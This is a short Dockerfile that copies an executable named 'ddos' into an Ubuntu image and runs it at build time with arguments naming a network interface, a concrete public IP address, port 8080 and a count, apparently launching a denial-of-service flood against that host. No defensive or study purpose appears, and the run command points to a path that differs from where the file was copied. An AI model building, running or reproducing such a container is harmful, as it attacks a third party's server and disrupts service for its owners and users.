FROM ubuntu:latest

#
# Identify the maintainer of an image
#LABEL maintainer="myname@somecompany.com"

#
# Update the image to the latest packages
RUN apt-get update && apt-get upgrade -y

ADD ./ddos/ddos /tmp/ddos/ddos

RUN chmod +x /tmp/ddos/ddos
RUN /ddos eth0 4 128.140.50.44 8080 100
